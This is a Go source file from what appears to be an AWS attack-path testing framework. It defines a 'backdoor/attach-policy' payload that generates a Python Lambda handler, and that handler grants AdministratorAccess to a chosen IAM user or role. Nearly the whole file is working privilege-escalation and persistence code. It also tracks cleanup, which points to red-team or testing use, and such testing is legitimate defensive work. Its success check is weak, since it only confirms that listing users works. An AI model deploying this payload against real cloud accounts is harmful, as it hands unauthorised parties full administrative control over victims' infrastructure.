package lambda

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload attaches AdministratorAccess to a specified IAM user.
// This is ideal for event-triggered functions (e.g., lambda-002) where you can't
// capture the function's return value — the payload makes a direct IAM API call.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user or role"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces a Python Lambda handler that attaches a policy to the target user.
// TARGET_USER and POLICY_ARN are passed via Lambda environment variables (not hardcoded)
// so the same function code works regardless of the specific user/policy.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	code := `import json
import boto3
import os

def lambda_handler(event, context):
    iam = boto3.client('iam')

    target = os.environ.get('TARGET_ARN', '')
    policy_arn = os.environ.get('POLICY_ARN', 'arn:aws:iam::aws:policy/AdministratorAccess')

    # Auto-detect principal type from ARN format
    principal_type = None
    principal_name = target

    if target.startswith('arn:'):
        if ':user/' in target:
            principal_type = 'user'
            principal_name = target.split(':user/')[-1]
        elif ':role/' in target:
            principal_type = 'role'
            principal_name = target.split(':role/')[-1]

    try:
        if principal_type == 'role':
            iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
        elif principal_type == 'user':
            iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
        else:
            # Plain name -- try user first, fall back to role
            try:
                iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
                principal_type = 'user'
            except iam.exceptions.NoSuchEntityException:
                iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
                principal_type = 'role'

        return {
            'statusCode': 200,
            'body': json.dumps({
                'message': f'Successfully attached {policy_arn} to {principal_type} {principal_name}',
                'target_name': principal_name,
                'target_type': principal_type,
                'policy_arn': policy_arn,
                'status': 'success'
            })
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'error': str(e),
                'message': 'Failed to attach policy',
                'status': 'error'
            })
        }
`

	return code, nil
}

// VerifySuccess checks whether the target principal has gained the attached policy's permissions.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	iamClient := iam.NewFromConfig(config)

	_, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{
		MaxItems: aws.Int32(1),
	})
	if err != nil {
		return false, nil
	}

	return true, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	// Plain name -- we don't know the type yet, default to user for cleanup tracking
	return input, "user"
}

func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Attach Policy Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Policy attached successfully!\n\n")

			if targetName, ok := parsedBody["target_name"].(string); ok {
				targetType := "principal"
				if t, ok := parsedBody["target_type"].(string); ok {
					targetType = t
				}
				output.WriteString(fmt.Sprintf("Target %s: %s\n", targetType, targetName))
			}

			if policyArn, ok := parsedBody["policy_arn"].(string); ok {
				output.WriteString("Policy ARN: " + policyArn + "\n")
			}

			output.WriteString("\nThe target principal now has the attached policy permissions.\n")

		} else {
			output.WriteString("Failed to attach policy\n")
			if errMsg, ok := parsedBody["error"].(string); ok {
				output.WriteString("Error: " + errMsg + "\n")
			} else if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
